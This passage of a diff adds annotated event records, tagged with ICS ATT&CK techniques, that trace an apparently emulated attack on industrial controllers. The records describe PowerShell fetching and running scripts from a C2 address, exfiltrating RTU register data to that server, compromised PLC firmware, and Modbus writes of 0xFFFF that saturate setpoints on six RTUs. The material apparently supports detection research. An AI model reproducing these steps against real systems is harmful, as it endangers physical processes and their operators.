+  note: Lateral Tool Transfer — powershell (Invoke-WebRequest) fetches fresh modbus.exe from C2 (58.16.10.16:8888), overwriting
+    the ews_reverse-dropped copy before the recon phase.
+- seq: 218
+  timestamp: '2026-03-09T11:07:29Z'
+  rel: CREATE_PROCESS
+  src: '{890a8c73-9843-86bb-01fe-226fdf29e622}'
+  dst: '{babaf0d5-71f3-5255-b3e7-f560eada10e4}'
+  technique: T0861
+  note: Point & Tag Identification — WinrsHost spawns "cmd.exe /C powershell -encodedcommand [IEX collect_normal.ps1]" which
+    runs modbus.exe -f read.json to read holding/coil/discrete/input registers from all 6 RTUs (192.168.44.13-21) and save
+    to C:\result.json.
+- seq: 219
+  timestamp: '2026-03-09T11:07:29Z'
+  rel: CONNECT_TO
+  src: '{71795490-a342-3593-310b-f4e5d1e058dd}'
+  dst: '{7c5af86c-2f1e-155d-53a9-17680a817207}'
+  technique: T0861
+  note: Point & Tag Identification — powershell IEX collect_normal.ps1 fetches the script from C2 (58.16.10.16:8888) to orchestrate
+    Modbus register baseline collection.
+- seq: 220
+  timestamp: '2026-03-09T11:07:29Z'
+  rel: CREATE_PROCESS
+  src: '{71795490-a342-3593-310b-f4e5d1e058dd}'
+  dst: '{a0ef28d6-7f68-f857-b4da-fa5db2f23623}'
+  technique: T0861
+  note: Point & Tag Identification — powershell (IEX collect_normal.ps1) spawns modbus.exe -f read.json to read holding registers
+    from all 6 RTUs for reconnaissance.
+- seq: 221
+  timestamp: '2026-03-09T11:07:30Z'
+  rel: CONNECT_TO
+  src: '{d41d5ace-c827-b6ae-fee1-61aacc581d1e}'
+  dst: '{4bfdd719-1030-2cbe-b017-f27fe67ff1a0}'
+  technique: T0861
+  note: Point & Tag Identification — modbus.exe (-f read.json) opens Modbus TCP session to RTU-01 (192.168.44.13:502); reads
+    100 holding/coil/discrete/input registers for reconnaissance.
+- seq: 222
+  timestamp: '2026-03-09T11:07:30Z'
+  rel: CONNECT_TO
+  src: '{d41d5ace-c827-b6ae-fee1-61aacc581d1e}'
+  dst: '{3aa8fb13-d475-f308-3ac4-aab1d65c8171}'
+  technique: T0861
+  note: Point & Tag Identification — modbus.exe opens Modbus TCP session to RTU-02 (192.168.44.14:502).
+- seq: 223
+  timestamp: '2026-03-09T11:07:30Z'
+  rel: CONNECT_TO
+  src: '{d41d5ace-c827-b6ae-fee1-61aacc581d1e}'
+  dst: '{dfa6117c-d6fd-0919-e444-3cf0348f5407}'
+  technique: T0861
+  note: Point & Tag Identification — modbus.exe opens Modbus TCP session to RTU-03 (192.168.44.15:502).
+- seq: 224
+  timestamp: '2026-03-09T11:07:30Z'
+  rel: CONNECT_TO
+  src: '{d41d5ace-c827-b6ae-fee1-61aacc581d1e}'
+  dst: '{5b0b1255-b762-bfb8-28e9-e9dd4b45f312}'
+  technique: T0861
+  note: Point & Tag Identification — modbus.exe opens Modbus TCP session to RTU-04 (192.168.44.16:502).
+- seq: 225
+  timestamp: '2026-03-09T11:07:30Z'
+  rel: CONNECT_TO
+  src: '{d41d5ace-c827-b6ae-fee1-61aacc581d1e}'
+  dst: '{a0bf2cd5-b035-d28e-86aa-cf6ec1d4a2cb}'
+  technique: T0861
+  note: Point & Tag Identification — modbus.exe opens Modbus TCP session to RTU-05 (192.168.44.17:502).
+- seq: 226
+  timestamp: '2026-03-09T11:07:30Z'
+  rel: CONNECT_TO
+  src: '{d41d5ace-c827-b6ae-fee1-61aacc581d1e}'
+  dst: '{4b9cabce-8fe0-d119-ce2c-2e021bb85d39}'
+  technique: T0861
+  note: Point & Tag Identification — modbus.exe opens Modbus TCP session to RTU-06 (192.168.44.21:502); all 6 RTU register
+    snapshots saved to C:\result.json.
+- seq: 227
+  timestamp: '2026-03-09T11:08:30Z'
+  rel: CREATE_PROCESS
+  src: '{72a87c74-4ffd-b7a2-bdf3-aaea8737c94b}'
+  dst: '{a7e857de-1337-d82a-0eff-a1c21a8851a8}'
+  technique: T0882
+  note: Theft of Operational Information — WinrsHost spawns "cmd.exe /C powershell -encodedcommand [(Get-Item \"C:\result.json\").Length]"
+    to verify the reconnaissance file was written before downloading it.
+- seq: 228
+  timestamp: '2026-03-09T11:08:30Z'
+  rel: CREATE_PROCESS
+  src: '{e96ce987-5d39-ce3f-cd1f-a9120d7bfc80}'
+  dst: '{7fd3452f-6f7a-b9a0-a747-81d25f6510a7}'
+  technique: T0882
+  note: Theft of Operational Information — WinrsHost spawns "cmd.exe /C powershell -encodedcommand [Open C:\result.json, read
+    100KB, return as Base64]" to exfiltrate RTU register data over the WinRM channel back to the attacker.
+- seq: 229
+  timestamp: '2026-03-09T11:08:30Z'
+  rel: CREATE_FILE
+  src: '{47281626-07fd-6818-ded0-88523789d7c2}'
+  dst: '{591803f3-2ca3-0d88-cb6c-da80d55feead}'
+  technique: T0882
+  note: Theft of Operational Information — frostygoop_agent.exe saves the WinRM-downloaded result.json to C:\Users\Administrator\Documents\result.json
+    on EWS-WIN-01 (local working dir), then uploads it to C2 via HTTP POST to 58.16.10.16:8888/upload.
+- seq: 230
+  timestamp: '2026-03-09T14:51:51Z'
+  rel: CREATE_PROCESS
+  src: '{4cae5c95-6a2a-69df-1680-4cf529b0a349}'
+  dst: '{0be7051a-77b9-f69f-7013-3e8aec014ea2}'
+  technique: T0867
+  note: Lateral Tool Transfer — WinrsHost spawns "cmd.exe /C powershell -encodedcommand [IWR .../payload.json → C:\ProgramData\payload.json]"
+    to stage the Modbus attack payload (FC=16 write 0xFFFF to registers 0-5 on RTU-01 through RTU-04, and registers 0,1,2,4
+    on RTU-05 and RTU-06).
+- seq: 231
+  timestamp: '2026-03-09T14:51:51Z'
+  rel: CONNECT_TO
+  src: '{8da7bfe9-0139-9d89-96f5-f8ef7f7f04fa}'
+  dst: '{7c5af86c-2f1e-155d-53a9-17680a817207}'
+  technique: T0867
+  note: Lateral Tool Transfer — powershell (Invoke-WebRequest) downloads payload.json from C2 (58.16.10.16:8888); the Modbus
+    write configuration for the attack phase.
+- seq: 232
+  timestamp: '2026-03-09T14:51:52Z'
+  rel: CREATE_FILE
+  src: '{8da7bfe9-0139-9d89-96f5-f8ef7f7f04fa}'
+  dst: '{9b0c3fe4-8c1b-c836-bb8f-a053221d6da6}'
+  technique: T0867
+  note: Lateral Tool Transfer — powershell writes C:\ProgramData\payload.json (Modbus FC=16 attack config for all 6 RTUs)
+    to disk on EWS-WIN-01.
+- seq: 233
+  timestamp: '2026-03-09T18:35:12Z'
+  rel: CONNECT_TO
+  src: '{47281626-07fd-6818-ded0-88523789d7c2}'
+  dst: '{7c5af86c-2f1e-155d-53a9-17680a817207}'
+  technique: T0857
+  note: System Firmware — frostygoop_agent.exe sends HTTP HEAD request to C2 (58.16.10.16:8888) to get expected size of openplc_with_programs.tar
+    before instructing PLC to download it; used for integrity verification after PLC wget.
+- seq: 234
+  timestamp: '2026-03-09T18:35:49Z'
+  rel: CONNECT_TO
+  src: runtime://PLC-03
+  dst: '{3aa8fb13-d475-f308-3ac4-aab1d65c8171}'
+  technique: T0855
+  note: Compromised PLC-03 firmware establishes Modbus TCP/502 session to RTU-02; second rogue SCADA controller ICS impact
+    vector.
+- seq: 235
+  timestamp: '2026-03-09T18:35:49Z'
+  rel: CONNECT_TO
+  src: runtime://PLC-03
+  dst: '{4b9cabce-8fe0-d119-ce2c-2e021bb85d39}'
+  technique: T0855
+  note: Compromised PLC-03 firmware establishes Modbus TCP/502 session to RTU-06; second rogue SCADA controller ICS impact
+    vector.
+- seq: 236
+  timestamp: '2026-03-09T18:35:49Z'
+  rel: CONNECT_TO
+  src: runtime://PLC-03
+  dst: '{4bfdd719-1030-2cbe-b017-f27fe67ff1a0}'
+  technique: T0855
+  note: Compromised PLC-03 firmware establishes Modbus TCP/502 session to RTU-01; second rogue SCADA controller ICS impact
+    vector.
+- seq: 237
+  timestamp: '2026-03-09T18:35:49Z'
+  rel: CONNECT_TO
+  src: runtime://PLC-03
+  dst: '{5b0b1255-b762-bfb8-28e9-e9dd4b45f312}'
+  technique: T0855
+  note: Compromised PLC-03 firmware establishes Modbus TCP/502 session to RTU-04; second rogue SCADA controller ICS impact
+    vector.
+- seq: 238
+  timestamp: '2026-03-09T18:35:49Z'
+  rel: CONNECT_TO
+  src: runtime://PLC-03
+  dst: '{a0bf2cd5-b035-d28e-86aa-cf6ec1d4a2cb}'
+  technique: T0855
+  note: Compromised PLC-03 firmware establishes Modbus TCP/502 session to RTU-05; second rogue SCADA controller ICS impact
+    vector.
+- seq: 239
+  timestamp: '2026-03-09T18:35:49Z'
+  rel: CONNECT_TO
+  src: runtime://PLC-03
+  dst: '{dfa6117c-d6fd-0919-e444-3cf0348f5407}'
+  technique: T0855
+  note: Compromised PLC-03 firmware establishes Modbus TCP/502 session to RTU-03; second rogue SCADA controller ICS impact
+    vector.
+- seq: 240
+  timestamp: '2026-03-09T18:35:49Z'
+  rel: WRITE_SIGNAL
+  src: runtime://PLC-03
+  dst: '{3188ce06-bad0-d8b9-d0ae-ae40de9acf9c}'
+  technique: T0836
+  note: Compromised PLC-03 firmware writes unauthorized value to RTU-01 holding register; firmware downgrade created second
+    rogue Modbus controller distinct from modbus.exe.
+- seq: 241
+  timestamp: '2026-03-09T18:35:49Z'
+  rel: WRITE_SIGNAL
+  src: runtime://PLC-03
+  dst: '{6e6acc56-68de-692c-27d6-ff71f5dc5ad2}'
+  technique: T0836
+  note: Compromised PLC-03 firmware writes unauthorized value to RTU-06 holding register; firmware downgrade created second
+    rogue Modbus controller distinct from modbus.exe.
+- seq: 242
+  timestamp: '2026-03-09T18:35:49Z'
+  rel: WRITE_SIGNAL
+  src: runtime://PLC-03
+  dst: '{9cff0568-8cd0-a692-eee3-633f0099144b}'
+  technique: T0836
+  note: Compromised PLC-03 firmware writes unauthorized value to RTU-02 holding register; firmware downgrade created second
+    rogue Modbus controller distinct from modbus.exe.
+- seq: 243
+  timestamp: '2026-03-09T18:35:49Z'
+  rel: WRITE_SIGNAL
+  src: runtime://PLC-03
+  dst: '{aab8ab15-288d-2582-e163-3f56518cd9e6}'
+  technique: T0836
+  note: Compromised PLC-03 firmware writes unauthorized value to RTU-03 holding register; firmware downgrade created second
+    rogue Modbus controller distinct from modbus.exe.
+- seq: 244
+  timestamp: '2026-03-09T18:35:55Z'
+  rel: CREATE_PROCESS
+  src: '{db80ffd9-593f-a3e3-0617-353bed1b45d3}'
+  dst: '{6935b9e8-449c-16ac-04e9-a7e60340bb1b}'
+  technique: T0855
+  note: Unauthorized Command Message — WinrsHost spawns "cmd.exe /C powershell -encodedcommand [IEX payload_normal.ps1]" which
+    executes modbus.exe -f C:\ProgramData\payload.json --cycle 10, firing FC=16 WriteMultipleRegisters of 0xFFFF to holding
+    registers on all 6 RTUs.
+- seq: 245
+  timestamp: '2026-03-09T18:35:55Z'
+  rel: CONNECT_TO
+  src: '{47281626-07fd-6818-ded0-88523789d7c2}'
+  dst: '{2056389b-10fe-9141-564b-72d2e3c1277a}'
+  technique: T0855
+  note: Unauthorized Command Message — frostygoop_agent.exe opens WinRM session to EWS-WIN-01:5985 to execute payload_normal.ps1
+    via IEX; this is the initiator-side edge for the WinrsHost cmd.exe event in seq 34.
+- seq: 246
+  timestamp: '2026-03-09T18:35:55Z'
+  rel: CONNECT_TO
+  src: '{ee345a85-f59b-6f9b-714b-8a0b384b1859}'
+  dst: '{7c5af86c-2f1e-155d-53a9-17680a817207}'
+  technique: T0855
+  note: Unauthorized Command Message — powershell IEX payload_normal.ps1 fetches the attack script from C2 (58.16.10.16:8888)
+    immediately before spawning modbus.exe for the Modbus write campaign.
+- seq: 247
+  timestamp: '2026-03-09T18:35:56Z'
+  rel: CONNECT_TO
+  src: '{e1e2a74c-2d22-30b6-3da5-f629e073db43}'
+  dst: '{4bfdd719-1030-2cbe-b017-f27fe67ff1a0}'
+  technique: T0855
+  note: Unauthorized Command Message — modbus.exe (-f payload.json) opens Modbus TCP session to RTU-01 (192.168.44.13:502)
+    for attack writes.
+- seq: 248
+  timestamp: '2026-03-09T18:35:56Z'
+  rel: WRITE_SIGNAL
+  src: '{e1e2a74c-2d22-30b6-3da5-f629e073db43}'
+  dst: '{7e15597b-fee2-8768-3dfb-f7f643c5a6cd}'
+  technique: T0836
+  note: Modify Parameter — FC=16 WriteMultipleRegisters writes 0xFFFF (65535) to RTU-01 holding register 0, saturating the
+    setpoint to maximum and corrupting the process control state.
+- seq: 249
+  timestamp: '2026-03-09T18:35:56Z'
+  rel: WRITE_SIGNAL
+  src: '{e1e2a74c-2d22-30b6-3da5-f629e073db43}'
+  dst: '{35a81b5b-6950-1d8a-9d3e-627831ab995a}'
+  technique: T0836
+  note: Modify Parameter — FC=16 writes 0xFFFF to RTU-01 holding register 1.
+- seq: 250
+  timestamp: '2026-03-09T18:35:56Z'
+  rel: CONNECT_TO
+  src: '{e1e2a74c-2d22-30b6-3da5-f629e073db43}'
+  dst: '{3aa8fb13-d475-f308-3ac4-aab1d65c8171}'
+  technique: T0855
+  note: Unauthorized Command Message — modbus.exe opens Modbus TCP session to RTU-02 (192.168.44.14:502).
+- seq: 251
+  timestamp: '2026-03-09T18:35:56Z'
+  rel: WRITE_SIGNAL
+  src: '{e1e2a74c-2d22-30b6-3da5-f629e073db43}'
+  dst: '{621d239a-2ced-00c0-6d3f-5da6f03dd23a}'
+  technique: T0836
+  note: Modify Parameter — FC=16 writes 0xFFFF to RTU-02 holding register 0.
+- seq: 252
+  timestamp: '2026-03-09T18:35:56Z'
+  rel: WRITE_SIGNAL
+  src: '{e1e2a74c-2d22-30b6-3da5-f629e073db43}'
+  dst: '{367eb768-4b94-c6ac-1c38-00e6da354bed}'
+  technique: T0836
+  note: Modify Parameter — FC=16 writes 0xFFFF to RTU-02 holding register 1.
+- seq: 253
+  timestamp: '2026-03-09T18:35:56Z'
+  rel: CONNECT_TO
+  src: '{e1e2a74c-2d22-30b6-3da5-f629e073db43}'
+  dst: '{dfa6117c-d6fd-0919-e444-3cf0348f5407}'
+  technique: T0855
+  note: Unauthorized Command Message — modbus.exe opens Modbus TCP session to RTU-03 (192.168.44.15:502).
+- seq: 254
+  timestamp: '2026-03-09T18:35:56Z'
+  rel: WRITE_SIGNAL
+  src: '{e1e2a74c-2d22-30b6-3da5-f629e073db43}'
+  dst: '{8fda0c62-5093-1db0-ee0e-d62c6bb41326}'
+  technique: T0836
+  note: Modify Parameter — FC=16 writes 0xFFFF to RTU-03 holding register 0.
+- seq: 255
+  timestamp: '2026-03-09T18:35:56Z'
+  rel: WRITE_SIGNAL
+  src: '{e1e2a74c-2d22-30b6-3da5-f629e073db43}'
+  dst: '{498289eb-b89c-ea3d-7718-3a84a89fe3c4}'
+  technique: T0836
+  note: Modify Parameter — FC=16 writes 0xFFFF to RTU-03 holding register 1.
+- seq: 256
+  timestamp: '2026-03-09T18:35:56Z'
+  rel: CONNECT_TO
+  src: '{e1e2a74c-2d22-30b6-3da5-f629e073db43}'
+  dst: '{5b0b1255-b762-bfb8-28e9-e9dd4b45f312}'
+  technique: T0855
+  note: Unauthorized Command Message — modbus.exe opens Modbus TCP session to RTU-04 (192.168.44.16:502).
+- seq: 257
+  timestamp: '2026-03-09T18:35:56Z'
+  rel: WRITE_SIGNAL
+  src: '{e1e2a74c-2d22-30b6-3da5-f629e073db43}'
+  dst: '{ba943ff6-701f-8093-fb71-af19faa7abe5}'
+  technique: T0836
+  note: Modify Parameter — FC=16 writes 0xFFFF to RTU-04 holding register 0.
+- seq: 258
+  timestamp: '2026-03-09T18:35:56Z'
+  rel: WRITE_SIGNAL
+  src: '{e1e2a74c-2d22-30b6-3da5-f629e073db43}'
+  dst: '{d169f537-322c-9001-4590-d2f2f87ed9b7}'
+  technique: T0836
+  note: Modify Parameter — FC=16 writes 0xFFFF to RTU-04 holding register 1.
+- seq: 259
+  timestamp: '2026-03-09T18:35:56Z'
+  rel: CONNECT_TO
+  src: '{e1e2a74c-2d22-30b6-3da5-f629e073db43}'
+  dst: '{a0bf2cd5-b035-d28e-86aa-cf6ec1d4a2cb}'
+  technique: T0855
+  note: Unauthorized Command Message — modbus.exe opens Modbus TCP session to RTU-05 (192.168.44.17:502).
+- seq: 260
+  timestamp: '2026-03-09T18:35:56Z'
+  rel: WRITE_SIGNAL
+  src: '{e1e2a74c-2d22-30b6-3da5-f629e073db43}'
+  dst: '{b6f47bae-2c48-cee9-00d8-794b69b8b68d}'
+  technique: T0836
+  note: Modify Parameter — FC=16 writes 0xFFFF to RTU-05 holding register 0.
+- seq: 261
+  timestamp: '2026-03-09T18:35:56Z'
+  rel: WRITE_SIGNAL
+  src: '{e1e2a74c-2d22-30b6-3da5-f629e073db43}'
+  dst: '{26cc1cd2-e2c1-0820-69d7-8392ae68b83f}'
+  technique: T0836
+  note: Modify Parameter — FC=16 writes 0xFFFF to RTU-05 holding register 1.
+- seq: 262
+  timestamp: '2026-03-09T18:35:56Z'
+  rel: CONNECT_TO
+  src: '{e1e2a74c-2d22-30b6-3da5-f629e073db43}'
+  dst: '{4b9cabce-8fe0-d119-ce2c-2e021bb85d39}'
+  technique: T0855
+  note: Unauthorized Command Message — modbus.exe opens Modbus TCP session to RTU-06 (192.168.44.21:502).
+- seq: 263
+  timestamp: '2026-03-09T18:35:56Z'
+  rel: WRITE_SIGNAL
+  src: '{e1e2a74c-2d22-30b6-3da5-f629e073db43}'
+  dst: '{23cfdf7d-f7d5-4600-61a7-e88542168643}'
+  technique: T0836
+  note: Modify Parameter — FC=16 writes 0xFFFF to RTU-06 holding register 0.
+- seq: 264
+  timestamp: '2026-03-09T18:35:56Z'
+  rel: WRITE_SIGNAL
+  src: '{e1e2a74c-2d22-30b6-3da5-f629e073db43}'
+  dst: '{de9aec6c-aec9-465e-85b9-fb48cb1b28a3}'
+  technique: T0836
+  note: Modify Parameter — FC=16 writes 0xFFFF to RTU-06 holding register 1.
+- seq: 265
+  timestamp: '2026-03-09T18:35:56Z'
+  rel: WRITE_SIGNAL
+  src: '{e1e2a74c-2d22-30b6-3da5-f629e073db43}'
+  dst: '{c23bb612-12a0-089e-5495-23dd6c79f9a6}'
+  technique: T0836
+  note: Modify Parameter — FC=16 writes 0xFFFF to RTU-01 holding register 2.
+- seq: 266
+  timestamp: '2026-03-09T18:35:56Z'
+  rel: WRITE_SIGNAL
+  src: '{e1e2a74c-2d22-30b6-3da5-f629e073db43}'
+  dst: '{cb6f5e09-9723-f11e-9c01-abe65511c778}'
+  technique: T0836
+  note: Modify Parameter — FC=16 writes 0xFFFF to RTU-01 holding register 3.
+- seq: 267
+  timestamp: '2026-03-09T18:35:56Z'
+  rel: WRITE_SIGNAL
+  src: '{e1e2a74c-2d22-30b6-3da5-f629e073db43}'
+  dst: '{e8c3903c-bce3-7be7-75aa-b1a643ef6f03}'
+  technique: T0836
+  note: Modify Parameter — FC=16 writes 0xFFFF to RTU-01 holding register 4.
+- seq: 268
+  timestamp: '2026-03-09T18:35:56Z'
+  rel: WRITE_SIGNAL
+  src: '{e1e2a74c-2d22-30b6-3da5-f629e073db43}'
+  dst: '{56de58c5-997f-cc1f-9e84-4215b7f89805}'
+  technique: T0836
+  note: Modify Parameter — FC=16 writes 0xFFFF to RTU-01 holding register 5.
+- seq: 269
+  timestamp: '2026-03-09T18:35:56Z'
+  rel: WRITE_SIGNAL
+  src: '{e1e2a74c-2d22-30b6-3da5-f629e073db43}'
+  dst: '{6ac9ef40-0cba-7a2d-ee65-e1ba68d8d309}'
+  technique: T0836
+  note: Modify Parameter — FC=16 writes 0xFFFF to RTU-02 holding register 2.
+- seq: 270
+  timestamp: '2026-03-09T18:35:56Z'
+  rel: WRITE_SIGNAL
+  src: '{e1e2a74c-2d22-30b6-3da5-f629e073db43}'
+  dst: '{b149c552-9026-83a8-abca-0c09a84a70c9}'
+  technique: T0836
+  note: Modify Parameter — FC=16 writes 0xFFFF to RTU-02 holding register 3.
+- seq: 271
+  timestamp: '2026-03-09T18:35:56Z'
+  rel: WRITE_SIGNAL
+  src: '{e1e2a74c-2d22-30b6-3da5-f629e073db43}'
+  dst: '{c0fe948a-1025-b6c3-9522-204c58834347}'
+  technique: T0836
+  note: Modify Parameter — FC=16 writes 0xFFFF to RTU-02 holding register 4.
+- seq: 272
+  timestamp: '2026-03-09T18:35:56Z'
+  rel: WRITE_SIGNAL
+  src: '{e1e2a74c-2d22-30b6-3da5-f629e073db43}'
+  dst: '{e492c32d-f0d0-cdce-15e6-ae1f637ef643}'
+  technique: T0836
+  note: Modify Parameter — FC=16 writes 0xFFFF to RTU-02 holding register 5.
+- seq: 273
+  timestamp: '2026-03-09T18:35:56Z'
+  rel: WRITE_SIGNAL
+  src: '{e1e2a74c-2d22-30b6-3da5-f629e073db43}'
+  dst: '{a469a41f-0e71-6252-5c25-b6368153f684}'
+  technique: T0836
+  note: Modify Parameter — FC=16 writes 0xFFFF to RTU-03 holding register 2.
+- seq: 274
+  timestamp: '2026-03-09T18:35:56Z'
+  rel: WRITE_SIGNAL
+  src: '{e1e2a74c-2d22-30b6-3da5-f629e073db43}'
+  dst: '{00692680-8c06-8b42-5246-f11486aefae2}'
+  technique: T0836
+  note: Modify Parameter — FC=16 writes 0xFFFF to RTU-03 holding register 3.
+- seq: 275
+  timestamp: '2026-03-09T18:35:56Z'
+  rel: WRITE_SIGNAL
+  src: '{e1e2a74c-2d22-30b6-3da5-f629e073db43}'
+  dst: '{4e524f24-f2be-3cb6-ec27-69966cda77d1}'
+  technique: T0836
+  note: Modify Parameter — FC=16 writes 0xFFFF to RTU-03 holding register 4.
+- seq: 276
+  timestamp: '2026-03-09T18:35:56Z'
+  rel: WRITE_SIGNAL
+  src: '{e1e2a74c-2d22-30b6-3da5-f629e073db43}'
+  dst: '{f21aa7bc-b7ae-34f4-fa8a-1cc66818618f}'
+  technique: T0836
+  note: Modify Parameter — FC=16 writes 0xFFFF to RTU-03 holding register 5.
+- seq: 277
+  timestamp: '2026-03-09T18:35:56Z'
+  rel: WRITE_SIGNAL
+  src: '{e1e2a74c-2d22-30b6-3da5-f629e073db43}'
+  dst: '{03489431-f497-e972-db7b-a65d623818bf}'
+  technique: T0836
+  note: Modify Parameter — FC=16 writes 0xFFFF to RTU-04 holding register 2.
+- seq: 278
+  timestamp: '2026-03-09T18:35:56Z'
+  rel: WRITE_SIGNAL
+  src: '{e1e2a74c-2d22-30b6-3da5-f629e073db43}'
+  dst: '{6dbd94c2-2f23-5515-36d1-4f081016c9e8}'
+  technique: T0836
+  note: Modify Parameter — FC=16 writes 0xFFFF to RTU-04 holding register 3.
+- seq: 279
+  timestamp: '2026-03-09T18:35:56Z'
+  rel: WRITE_SIGNAL
+  src: '{e1e2a74c-2d22-30b6-3da5-f629e073db43}'
+  dst: '{6217e680-29d0-13c1-d350-5fdc3de64c5b}'
+  technique: T0836
+  note: Modify Parameter — FC=16 writes 0xFFFF to RTU-04 holding register 4.
+- seq: 280
+  timestamp: '2026-03-09T18:35:56Z'
+  rel: WRITE_SIGNAL
+  src: '{e1e2a74c-2d22-30b6-3da5-f629e073db43}'
+  dst: '{2c8ecbdf-4998-95ff-1225-ba2e1e119f0f}'
+  technique: T0836
+  note: Modify Parameter — FC=16 writes 0xFFFF to RTU-04 holding register 5.
+- seq: 281
+  timestamp: '2026-03-09T18:35:56Z'
+  rel: WRITE_SIGNAL
+  src: '{e1e2a74c-2d22-30b6-3da5-f629e073db43}'
+  dst: '{53460e72-618f-1cc2-6a2f-0d3d9532bc90}'
+  technique: T0836
+  note: Modify Parameter — FC=16 writes 0xFFFF to RTU-05 holding register 2 (payload.json omits registers 3 and 5 for RTU-05).
+- seq: 282
+  timestamp: '2026-03-09T18:35:56Z'
+  rel: WRITE_SIGNAL
+  src: '{e1e2a74c-2d22-30b6-3da5-f629e073db43}'
+  dst: '{cd74094a-8248-b3b5-74f9-67933cff4fbb}'
+  technique: T0836
+  note: Modify Parameter — FC=16 writes 0xFFFF to RTU-05 holding register 4.
+- seq: 283
+  timestamp: '2026-03-09T18:35:56Z'
+  rel: WRITE_SIGNAL
+  src: '{e1e2a74c-2d22-30b6-3da5-f629e073db43}'
+  dst: '{9dfe0320-4027-c8f7-92cd-cfec81eacd6d}'
+  technique: T0836
+  note: Modify Parameter — FC=16 writes 0xFFFF to RTU-06 holding register 2 (payload.json omits registers 3 and 5 for RTU-06).
+- seq: 284
+  timestamp: '2026-03-09T18:35:56Z'
+  rel: WRITE_SIGNAL
+  src: '{e1e2a74c-2d22-30b6-3da5-f629e073db43}'
+  dst: '{0ec9ec73-a3e6-f30e-e2ea-fa0cdf54edb7}'
+  technique: T0836
+  note: Modify Parameter — FC=16 writes 0xFFFF to RTU-06 holding register 4. RTU-01..04 now have 0xFFFF at registers 0-5;
+    RTU-05 and RTU-06 have 0xFFFF at registers 0,1,2,4; all 6 RTUs have lost process control.
+- seq: 285
+  timestamp: '2026-03-09T18:35:56Z'
+  rel: CREATE_PROCESS
+  src: '{ee345a85-f59b-6f9b-714b-8a0b384b1859}'
+  dst: '{b18e989e-2013-fabc-5563-e1b5b65ce080}'
+  technique: T0855
+  note: Unauthorized Command Message — powershell (IEX payload_normal.ps1) spawns modbus.exe -f payload.json --cycle 10 to
+    execute the Modbus FC=16 write attack against all 6 RTUs.
+- seq: 286
+  timestamp: '2026-03-09T18:35:56Z'
+  rel: CREATE_PROCESS
+  src: '{b18e989e-2013-fabc-5563-e1b5b65ce080}'
+  dst: '{e1e2a74c-2d22-30b6-3da5-f629e073db43}'
+  technique: T0836
+  note: Modify Parameter — modbus.exe forks the cyclic write worker process ({e1e2a74c}) that executes 84 FC=16 WriteMultipleRegisters
+    iterations per register across all 6 RTUs.
